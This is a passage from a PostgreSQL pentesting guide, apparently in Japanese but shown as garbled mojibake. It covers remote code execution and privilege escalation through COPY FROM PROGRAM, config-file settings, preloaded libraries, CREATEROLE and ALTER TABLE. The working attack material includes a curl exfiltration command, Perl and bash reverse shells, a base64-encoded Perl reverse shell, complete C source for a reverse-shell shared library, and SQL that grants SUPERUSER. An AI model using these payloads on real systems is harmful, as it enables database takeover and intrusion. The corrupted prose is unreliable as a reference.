WHERE pg_class.relname = '{TABLE_NAME}';
```
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)ã‚’ä½¿ç”¨ã—ã¦ã€[ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’ç·¨é›†](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users)ã—ã€ã™ã¹ã¦ã®`rol*`ãƒ–ãƒ¼ãƒ«ãƒ•ãƒ©ã‚°ã‚’1ã«è¨­å®šã—ã¦å®Œå…¨ãªæ¨©é™ã‚’ä»˜ä¸ã—ã¾ã™ã€‚

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. `lo_*`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ç·¨é›†æ¸ˆã¿ã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒãƒ¼ãƒ‰ã‚’å†ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®å…ƒã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¸Šæ›¸ã

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(ã‚ªãƒ—ã‚·ãƒ§ãƒ³)_ é«˜ã‚³ã‚¹ãƒˆã®SQLã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ã¦ã‚¤ãƒ³ãƒ¡ãƒ¢ãƒªãƒ†ãƒ¼ãƒ–ãƒ«ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’ã‚¯ãƒªã‚¢

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. ã“ã‚Œã§ã€PostgreSQLã§æ›´æ–°ã•ã‚ŒãŸãƒ†ãƒ¼ãƒ–ãƒ«å€¤ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¯ãšã§ã™ã€‚

`pg_authid`ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ç·¨é›†ã™ã‚‹ã“ã¨ã§ã‚¹ãƒ¼ãƒ‘ãƒ¼ã‚¢ãƒ‰ãƒŸãƒ³ã«ãªã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚**æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³**ã‚’å‚ç…§ã—ã¦ãã ã•ã„[pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables)ã€‚

## RCE

### **ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¸ã®RCE**

[ãƒãƒ¼ã‚¸ãƒ§ãƒ³9.3](https://www.postgresql.org/docs/9.3/release-9-3.html)ä»¥é™ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¨**`pg_execute_server_program`**ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã ã‘ãŒRCEã«COPYã‚’ä½¿ç”¨ã§ãã¾ã™ï¼ˆæƒ…å ±æ¼ãˆã„ã®ä¾‹:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
å®Ÿè¡Œä¾‹ï¼š
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã¯ãªã„ãŒã€**`CREATEROLE`** æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«ãªã‚‹ã“ã¨ãŒã§ãã¾ã™:**
```sql
GRANT pg_execute_server_program TO username;
```
[**è©³ç´°æƒ…å ±**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

ã¾ãŸã¯ã€**metasploit** ã® `multi/postgres/postgres_copy_from_program_cmd_exec` ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚\
ã“ã®è„†å¼±æ€§ã«é–¢ã™ã‚‹è©³ç´°ã¯[**ã“ã¡ã‚‰**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)ã§ç¢ºèªã§ãã¾ã™ã€‚CVE-2019-9193ã¨ã—ã¦å ±å‘Šã•ã‚Œã¾ã—ãŸãŒã€Postgesã¯ã“ã‚Œã‚’[æ©Ÿèƒ½ã¨ã—ã¦ä¿®æ­£ã—ãªã„ã“ã¨ã‚’å®£è¨€ã—ã¾ã—ãŸ](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ã€‚

### PostgreSQLè¨€èªã‚’ä½¿ç”¨ã—ãŸRCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQLæ‹¡å¼µæ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ãŸRCE

å‰ã®æŠ•ç¨¿ã‹ã‚‰**ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ–¹æ³•**ã‚’å­¦ã‚“ã å¾Œã€**PostgreSQLæ‹¡å¼µæ©Ÿèƒ½ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦èª­ã¿è¾¼ã‚€**ã“ã¨ã§RCEã‚’å–å¾—ã§ãã¾ã™ã€‚

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQLæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«RCE

{% hint style="info" %}
æ¬¡ã®RCEãƒ™ã‚¯ã‚¿ãƒ¼ã¯ã€ã™ã¹ã¦ã®æ‰‹é †ã‚’ãƒã‚¹ãƒˆã•ã‚ŒãŸSELECTã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’ä»‹ã—ã¦å®Ÿè¡Œã§ãã‚‹ãŸã‚ã€åˆ¶ç´„ã•ã‚ŒãŸSQLiã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ç‰¹ã«æœ‰ç”¨ã§ã™ã€‚
{% endhint %}

PostgreSQLã®**æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«**ã¯**postgresãƒ¦ãƒ¼ã‚¶**ã«ã‚ˆã£ã¦**æ›¸ãè¾¼ã¿å¯èƒ½**ã§ã‚ã‚Šã€ã“ã‚Œã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ã§ã‚ã‚‹ãŸã‚ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶**ã¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã€ã—ãŸãŒã£ã¦ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ä¸Šæ›¸ã**ã§ãã¾ã™ã€‚

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command**ã‚’ä½¿ç”¨ã—ãŸRCE

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«é–¢ã™ã‚‹è©³ç´°ã¯[ã“ã¡ã‚‰](https://pulsesecurity.co.nz/articles/postgres-sqli)ã§ç¢ºèªã§ãã¾ã™ã€‚

æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯RCEã«ã¤ãªãŒã‚‹èˆˆå‘³æ·±ã„å±æ€§ãŒã„ãã¤ã‹ã‚ã‚Šã¾ã™:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ç§˜å¯†éµã¸ã®ãƒ‘ã‚¹
* `ssl_passphrase_command = ''` ã‚‚ã—ç§˜å¯†ãƒ•ã‚¡ã‚¤ãƒ«ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€postgresqlã¯ã“ã®å±æ€§ã§æŒ‡å®šã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
* `ssl_passphrase_command_supports_reload = off` ã‚‚ã—ã“ã®å±æ€§ãŒonã®å ´åˆã€éµãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã«å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒãƒ³ãƒ‰ã¯ã€`pg_reload_conf()`ãŒå®Ÿè¡Œã•ã‚ŒãŸã¨ãã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ãã®å¾Œã€æ”»æ’ƒè€…ã¯æ¬¡ã®æ‰‹é †ã‚’è¸ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã™:

1. ã‚µãƒ¼ãƒã‹ã‚‰**ç§˜å¯†éµ**ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹
2. ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸç§˜å¯†éµã‚’**æš—å·åŒ–**ã™ã‚‹:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **ä¸Šæ›¸ã**
4. ç¾åœ¨ã®PostgreSQL **æ§‹æˆ**ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹
5. ä¸Šè¨˜ã®å±æ€§æ§‹æˆã§**æ§‹æˆ**ã‚’**ä¸Šæ›¸ã**ã™ã‚‹:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`ã‚’å®Ÿè¡Œã™ã‚‹

ã“ã‚Œã‚’ãƒ†ã‚¹ãƒˆã—ã¦ã¿ãŸã¨ã“ã‚ã€**ç§˜å¯†éµãƒ•ã‚¡ã‚¤ãƒ«ãŒæ¨©é™640**ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€**rootãŒæ‰€æœ‰**ã—ã¦ãŠã‚Šã€**ã‚°ãƒ«ãƒ¼ãƒ—ssl-certã¾ãŸã¯postgres**ï¼ˆã¤ã¾ã‚Špostgresãƒ¦ãƒ¼ã‚¶ãŒèª­ã¿å–ã‚Œã‚‹ï¼‰ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€_ /var/lib/postgresql/12/main_ã«é…ç½®ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã®ã¿æ©Ÿèƒ½ã™ã‚‹ã“ã¨ã«æ°—ã¥ãã¾ã—ãŸã€‚

#### **archive\_command**ã‚’ä½¿ç”¨ã—ãŸRCE

**WALã«é–¢ã™ã‚‹ã“ã®æ§‹æˆã¨ã“ã®æ§‹æˆã«é–¢ã™ã‚‹è©³ç´°**ã¯[ã“ã¡ã‚‰](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**ã§ç¢ºèªã§ãã¾ã™ã€‚**

æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã®åˆ¥ã®å±æ€§ã§ã‚ã‚‹`archive_command`ã¯æ‚ªç”¨å¯èƒ½ã§ã™ã€‚

ã“ã‚Œã‚’æ©Ÿèƒ½ã•ã›ã‚‹ã«ã¯ã€`archive_mode`è¨­å®šãŒ`'on'`ã¾ãŸã¯`'always'`ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã‚ŒãŒçœŸã§ã‚ã‚Œã°ã€`archive_command`ã§ã‚³ãƒãƒ³ãƒ‰ã‚’ä¸Šæ›¸ãã—ã€WALï¼ˆWrite-Ahead Loggingï¼‰æ“ä½œã‚’ä»‹ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä¸€èˆ¬çš„ãªæ‰‹é †ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:

1. ã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ãƒ¢ãƒ¼ãƒ‰ãŒæœ‰åŠ¹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹: `SELECT current_setting('archive_mode')`
2. `archive_command`ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä¸Šæ›¸ãã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. æ§‹æˆã‚’å†èª­ã¿è¾¼ã¿: `SELECT pg_reload_conf()`
4. WALæ“ä½œã‚’å®Ÿè¡Œã—ã€ã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ã‚³ãƒãƒ³ãƒ‰ã‚’å‘¼ã³å‡ºã—ã¾ã™: ä¸€éƒ¨ã®Postgresãƒãƒ¼ã‚¸ãƒ§ãƒ³ã§ã¯`SELECT pg_switch_wal()`ã¾ãŸã¯`SELECT pg_switch_xlog()`ã‚’ä½¿ç”¨ã—ã¾ã™

#### **preloadãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ãŸRCE**

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã«é–¢ã™ã‚‹è©³ç´°ã¯[ã“ã¡ã‚‰](https://adeadfed.com/posts/postgresql-select-only-rce/)ã§ç¢ºèªã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒãƒ™ã‚¯ãƒˆãƒ«ã¯æ¬¡ã®æ§‹æˆå¤‰æ•°ã‚’åˆ©ç”¨ã—ã¾ã™:

* `session_preload_libraries` -- PostgreSQLã‚µãƒ¼ãƒãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆæ¥ç¶šæ™‚ã«èª­ã¿è¾¼ã‚€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã€‚
* `dynamic_library_path` -- PostgreSQLã‚µãƒ¼ãƒãŒãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ¤œç´¢ã™ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒªã‚¹ãƒˆã€‚

`dynamic_library_path`ã®å€¤ã‚’ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹`postgres`ãƒ¦ãƒ¼ã‚¶ãŒæ›¸ãè¾¼ã¿å¯èƒ½ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼ˆãŸã¨ãˆã°`/tmp/`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼‰ã«è¨­å®šã—ã€ãã“ã«æ‚ªæ„ã®ã‚ã‚‹`.so`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚æ¬¡ã«ã€`session_preload_libraries`å¤‰æ•°ã«ãã‚Œã‚’å«ã‚ã¦ã€PostgreSQLã‚µãƒ¼ãƒã«æ–°ã—ãã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’èª­ã¿è¾¼ã‚€ã‚ˆã†ã«ã—ã¾ã™ã€‚

æ”»æ’ƒæ‰‹é †ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:

1. å…ƒã®`postgresql.conf`ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹
2. `dynamic_library_path`å€¤ã«`/tmp/`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å«ã‚ã‚‹ã€‚ä¾‹: `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries`å€¤ã«æ‚ªæ„ã®ã‚ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªåã‚’å«ã‚ã‚‹ã€‚ä¾‹: `session_preload_libraries = 'payload.so'`
4. `SELECT version()`ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ä¸»è¦ãªPostgreSQLãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹
5. æ­£ã—ã„PostgreSQL devãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¦æ‚ªæ„ã®ã‚ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚³ãƒ¼ãƒ‰ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¾ã™ã€‚ã‚µãƒ³ãƒ—ãƒ«ã‚³ãƒ¼ãƒ‰:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

ã‚³ãƒ¼ãƒ‰ã®ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. ã‚¹ãƒ†ãƒƒãƒ—2-3ã§ä½œæˆã—ãŸæ‚ªæ„ã®ã‚ã‚‹`postgresql.conf`ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€å…ƒã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¸Šæ›¸ãã™ã‚‹
7. ã‚¹ãƒ†ãƒƒãƒ—5ã§ä½œæˆã—ãŸ`payload.so`ã‚’`/tmp`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹
8. ã‚µãƒ¼ãƒãƒ¼æ§‹æˆã‚’å†èª­ã¿è¾¼ã¿ã™ã‚‹ãŸã‚ã«ã‚µãƒ¼ãƒãƒ¼ã‚’å†èµ·å‹•ã™ã‚‹ã‹ã€`SELECT pg_reload_conf()`ã‚¯ã‚¨ãƒªã‚’å‘¼ã³å‡ºã™
9. æ¬¡å›ã®DBæ¥ç¶šæ™‚ã«ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«æ¥ç¶šã‚’å—ã‘å–ã‚Šã¾ã™ã€‚
## **Postgres Privesc**

### CREATEROLE Privesc

#### **æ¨©é™ä»˜ä¸**

[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ**](https://www.postgresql.org/docs/13/sql-grant.html)ã«ã‚ˆã‚‹ã¨: _**`CREATEROLE`** æ¨©é™ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã¯ã€**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ãªã„** ä»»æ„ã®ãƒ­ãƒ¼ãƒ«ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã‚’**ä»˜ä¸ã¾ãŸã¯å–ã‚Šæ¶ˆã™**ã“ã¨ãŒã§ãã¾ã™ã€‚_

ã—ãŸãŒã£ã¦ã€**`CREATEROLE`** æ¨©é™ãŒã‚ã‚Œã°ã€è‡ªåˆ†è‡ªèº«ã«ä»–ã®**ãƒ­ãƒ¼ãƒ«**ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ä»˜ä¸ã§ãã¾ã™ï¼ˆã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ãªã„å ´åˆï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ãã‚„ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡ŒãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¤‰æ›´

ã“ã®ãƒ­ãƒ¼ãƒ«ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ä»–ã®**éã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã®**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚‚**å¤‰æ›´**ã§ãã¾ã™ã€‚
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSERã¸ã®æ˜‡æ ¼

**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã›ãšã«PostgreSQLã«ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹**ã“ã¨ãŒä¸€èˆ¬çš„ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ¨©é™ã‚’å–å¾—**ã—ãŸã‚‰ã€ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦**`SUPERUSER`**ãƒ­ãƒ¼ãƒ«ã‚’å–å¾—ã§ãã¾ã™ã€‚
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
ã“ã‚Œã¯é€šå¸¸ã€**`pg_hba.conf`** ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®æ¬¡ã®è¡Œã«ã‚ˆã£ã¦å¯èƒ½ã«ãªã‚Šã¾ã™ï¼š
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLEæ¨©é™æ˜‡æ ¼**

[**ã“ã®è§£èª¬**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä»˜ä¸ã•ã‚ŒãŸALTER TABLEæ¨©é™ã‚’æ‚ªç”¨ã—ã¦Postgres GCPã§æ¨©é™æ˜‡æ ¼ãŒå¯èƒ½ã ã£ãŸæ–¹æ³•ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚

é€šå¸¸ã€**åˆ¥ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…ã«ã™ã‚‹**ã¨ã„ã†æ“ä½œã¯ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¦é˜»æ­¢ã•ã‚Œã‚‹ã¯ãšã§ã™ãŒã€GCPã§ã¯**ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ãªã„postgresãƒ¦ãƒ¼ã‚¶ãƒ¼**ã«ãã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒä¸ãˆã‚‰ã‚Œã¦ã„ãŸã‚ˆã†ã§ã™ï¼š

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

ã“ã®è€ƒãˆæ–¹ã‚’åˆ©ç”¨ã—ã¦ã€**INSERT/UPDATE/ANALYZE**ã‚³ãƒãƒ³ãƒ‰ãŒ**ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹é–¢æ•°ã‚’æŒã¤ãƒ†ãƒ¼ãƒ–ãƒ«**ã§å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€**é–¢æ•°**ãŒ**ã‚³ãƒãƒ³ãƒ‰ã®ä¸€éƒ¨ã¨ã—ã¦å‘¼ã³å‡ºã•ã‚Œã€ãƒ†ãƒ¼ãƒ–ãƒ«ã®æ‰€æœ‰è€…æ¨©é™**ã§å®Ÿè¡Œã•ã‚Œã‚‹ã¨ã„ã†äº‹å®Ÿã‚’çµ„ã¿åˆã‚ã›ã‚‹ã¨ã€ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ‰€æœ‰æ¨©é™ã‚’ä¸ãˆãŸãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢æ•°ã‚’æŒã¤ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚’ä½œæˆã—ã€ãã®å¾Œã€æ‰€æœ‰è€…ã®æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹æ‚ªæ„ã®ã‚ã‚‹é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ãƒ†ãƒ¼ãƒ–ãƒ«ä¸Šã§ANALYZEã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### æ¾å–

1. æ–°ã—ã„ãƒ†ãƒ¼ãƒ–ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚
2. ãƒ†ãƒ¼ãƒ–ãƒ«ã«é–¢é€£æ€§ã®ãªã„ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’æŒ¿å…¥ã—ã¦ã€ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹æ©Ÿèƒ½ã®ãƒ‡ãƒ¼ã‚¿ã‚’æä¾›ã—ã¾ã™ã€‚
3. æ‚ªæ„ã®ã‚ã‚‹ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹æ©Ÿèƒ½ã‚’é–‹ç™ºã—ã€ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚ã€ä¸æ­£ãªã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’è¨±å¯ã—ã¾ã™ã€‚
